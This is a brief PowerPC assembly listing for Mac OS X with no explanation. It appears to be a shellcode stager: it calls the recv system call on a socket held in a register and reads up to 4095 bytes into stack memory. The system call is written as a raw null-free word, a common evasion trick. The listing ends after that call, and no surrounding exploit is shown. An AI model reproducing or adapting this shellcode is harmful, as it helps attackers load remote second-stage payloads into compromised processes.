.globl _main
.text
_main:
	li	r0, 102
	mr	r3, r30
	subi	r4, r1, 0xfff * 2
	li 	r5, 0xfff
	xor	r6, r6, r6
	.long   0x44ffff02
	xor.	r6, r6, r6
